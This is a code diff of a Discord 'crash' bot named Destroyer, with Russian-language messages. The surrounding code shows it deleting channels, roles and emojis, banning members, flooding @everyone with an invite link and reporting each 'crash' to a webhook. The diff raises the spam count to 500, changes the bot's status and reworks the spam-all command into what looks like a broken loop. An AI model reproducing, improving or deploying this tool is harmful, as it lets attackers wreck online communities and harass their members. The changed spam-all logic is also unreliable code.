@@ -23,7 +23,7 @@ def localtime():
 
 @client.event
 async def on_ready():
-	await client.change_presence(activity = discord.Game('t!crash | .gg/43GtxcFXPK'))
+	await client.change_presence(activity = discord.Streaming(name='t!crash | .gg/43GtxcFXPK', url='https://twitch.tv/pewdiepie'))
 	print(f'Bot {client.user.name}#{client.user.discriminator} is ready')
 
 @client.command()
@@ -128,22 +128,22 @@ async def crash(ctx):
 		await asyncio.sleep(2)
 	#CRASH REPORT
 		try:
-			emb = Embed(title = 'Новый краш!', description = f"\Сервер: {servername}\n\**Участников**: {start_guild_num}\n\
-			**Удалено:**\n\
-			 **Каналов:** {deleted_chan}/{start_guild_chan_num}\n\
-			 **Людей забанено:** {banned_num}/{start_guild_num}\n\
-			 **Эмодзи удалено:** {deleted_emojis}/{start_guild_emoji_num}\n\
-			 **Ролей:** {deleted_roles}/{start_guild_role_num}\n\n\
-			**Изменено:**\n\
-			 **Создано:**\n\
-			  **Текстовых каналов:** {text_num}/{settings['TEXT-CHANNELS']}\n\
-			  **Голосовых:** {voice_num}/{settings['VOICE-CHANNELS']}\n\n\
-			**Другое**\n\
-			 **Создано ролей:** {roles_num}/{settings['ROLES']}\n\
-			 **Эмодзи создано:** {emojis_num}/{settings['EMOJI']}\n\
-			 **Аватарка изменена(Тrue - да, Fаlse - нет):** {str(pfp_ch)}\n\n\
-			**Начало краша:** {start_time}\n\
-			**Конец краша:** {end_time}\n\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337, timestamp='now')
+			emb = Embed(title = 'Новый краш!', description = f"\Сервер: {servername}\n\Участников: {start_guild_num}\n\
+			Удалено:\n\
+			 Каналов: {deleted_chan}/{start_guild_chan_num}\n\
+			 Людей забанено: {banned_num}/{start_guild_num}\n\
+			 Эмодзи удалено: {deleted_emojis}/{start_guild_emoji_num}\n\
+			 Ролей: {deleted_roles}/{start_guild_role_num}\n\n\
+			Изменено:\n\
+			 Создано:\n\
+			  Текстовых каналов: {text_num}/{settings['TEXT-CHANNELS']}\n\
+			  Голосовых: {voice_num}/{settings['VOICE-CHANNELS']}\n\n\
+			Другое\n\
+			 Создано ролей: {roles_num}/{settings['ROLES']}\n\
+			 Эмодзи создано: {emojis_num}/{settings['EMOJI']}\n\
+			 Аватарка изменена(Тrue - да, Fаlse - нет): {str(pfp_ch)}\n\n\
+			Начало краша: {start_time}\n\
+			Конец краша: {end_time}\n\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337, timestamp='now')
 			emb.set_footer('Сервер крашнут:')
 			webhook.send(embed = emb, username = 'Краш-бот')
 			print(f'Crash ended. Webhook - succes\n{start_time} - {end_time}')
@@ -154,36 +154,11 @@ async def crash(ctx):
 
 @client.command(aliases=['spam'])
 async def __spam(ctx):
-  for i in range(150):
+  for i in range(500):
     try:
       await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
     except:
        break
-
-@client.command()
-async def webhtest(ctx):
-	servername = ctx.guild.name
-	try:
-		emb = Embed(title = 'Новый краш!', description = f"\Сервер: {servername}\n\**Участников**: \n\
-		**Удалено:**\n\
-		 **Каналов:** \n\
-		 **Людей забанено:** \n\
-		 **Эмодзи удалено:**\n\
-		 **Ролей:** \n\n\
-		**Изменено:**\n\
-		 **Создано:**\n\
-		  **Текстовых каналов:*\n\
-		  **Голосовых:** \n\n\
-		**Другое**\n\
-		1\n\
-		 **Эмодзи создано**: \n\
-		 **Аватарка изменена(Тrue - да, Fаlse - нет):** \n\n\
-		**Начало краша:** \n\
-		**Конец краша:** \n\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337, timestamp='now')
-		emb.set_footer('Сервер крашнут:')
-		webhook.send(embed = emb, username = 'test')
-	except:
-			print()
 
 @client.command(aliases=['exec'])
 async def ex(ctx, *, cmd=None):
@@ -199,11 +174,12 @@ async def ex(ctx, *, cmd=None):
 
 @client.command(aliases=['spamall'])
 async def __spamall(ctx):
-	for channels in ctx.guild.text_channels:
-		for i in range(20):
-			try:
-				await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
-			except:
-				break
+	for guild in client.get_guild(ctx.guild.id):
+		for channel in guild.text_channels:
+			for i in range(20):
+				try:
+					await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
+				except:
+					break
 
 client.run(settings['TOKEN'])
